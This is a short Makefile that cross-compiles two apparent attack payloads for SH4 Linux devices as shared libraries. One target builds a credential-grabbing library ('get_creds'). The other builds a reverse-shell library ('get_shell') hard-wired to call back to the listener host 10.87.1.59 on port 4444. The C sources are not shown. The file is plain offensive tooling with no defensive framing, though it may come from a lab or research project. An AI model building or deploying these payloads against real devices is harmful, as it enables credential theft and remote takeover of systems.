get_creds:
	sh4-linux-gnu-gcc -shared -fPIC ./get_creds.c -o ./payload.so

get_shell:
	sh4-linux-gnu-gcc -DLHOST=\"10.87.1.59\" -DLPORT=4444 -shared -fPIC ./get_shell.c -o ./payload.so 
